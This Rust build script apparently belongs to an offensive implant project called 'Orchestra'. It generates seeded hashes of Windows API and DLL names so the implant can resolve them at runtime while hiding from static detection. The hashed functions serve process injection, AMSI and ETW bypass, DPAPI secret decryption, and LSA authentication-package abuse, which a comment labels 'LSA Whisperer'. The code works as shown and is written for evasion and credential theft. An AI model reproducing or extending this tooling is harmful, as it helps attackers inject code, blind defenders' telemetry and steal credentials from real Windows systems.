use std::env;
use std::fs;
use std::path::Path;

fn hash_str(s: &str, seed: u32) -> u32 {
    let mut hash: u32 = seed;
    for b in s.bytes() {
        let b = b.to_ascii_lowercase();
        hash = hash.rotate_right(13) ^ (b as u32);
    }
    hash
}

fn configured_seed() -> u32 {
    if let Ok(raw) = env::var("ORCHESTRA_PE_RESOLVE_SEED") {
        if let Some(hex) = raw.strip_prefix("0x") {
            return u32::from_str_radix(hex, 16).unwrap_or(0x4f524348);
        }
        return raw.parse().unwrap_or(0x4f524348);
    }
    0x4f524348 // "ORCH"
}

fn main() {
    let out_dir = env::var_os("OUT_DIR").unwrap();
    let dest_path = Path::new(&out_dir).join("api_hashes.rs");

    let seed = configured_seed();

    let apis = [
        "NtAllocateVirtualMemory",
        "NtWriteVirtualMemory",
        "NtCreateThreadEx",
        "NtClose",
        "NtOpenFile",
        "NtProtectVirtualMemory",
        "AmsiScanBuffer",
        "NtSetInformationThread",
        "AmsiInitialize",
        "EtwEventWrite",
        "EtwEventWriteEx",
        "NtTraceEvent",
        "CryptUnprotectData",
        "NCryptUnprotectSecret",
        // LSA Whisperer — SSP interface exploitation (secur32.dll)
        "LsaConnectUntrusted",
        "LsaCallAuthenticationPackage",
        "LsaLookupAuthenticationPackage",
        "LsaRegisterLogonProcess",
        "LsaDeregisterLogonProcess",
        "LsaFreeReturnBuffer",
    ];
    let dlls = ["ntdll.dll", "amsi.dll", "kernel32.dll", "crypt32.dll", "ncrypt.dll", "secur32.dll"];

    let mut rs = format!("pub const SEED: u32 = {:#x};\n", seed);
    for api in apis {
        rs.push_str(&format!(
            "pub const HASH_{}: u32 = {:#x};\n",
            api.to_uppercase(),
            hash_str(api, seed)
        ));
    }
    for dll in dlls {
        let name = dll.replace(".", "_").to_uppercase();
        rs.push_str(&format!(
            "pub const HASH_{}: u32 = {:#x};\n",
            name,
            hash_str(dll, seed)
        ));
    }

    fs::write(&dest_path, rs).unwrap();
    println!("cargo:rerun-if-changed=build.rs");
    println!("cargo:rerun-if-env-changed=ORCHESTRA_PE_RESOLVE_SEED");
}
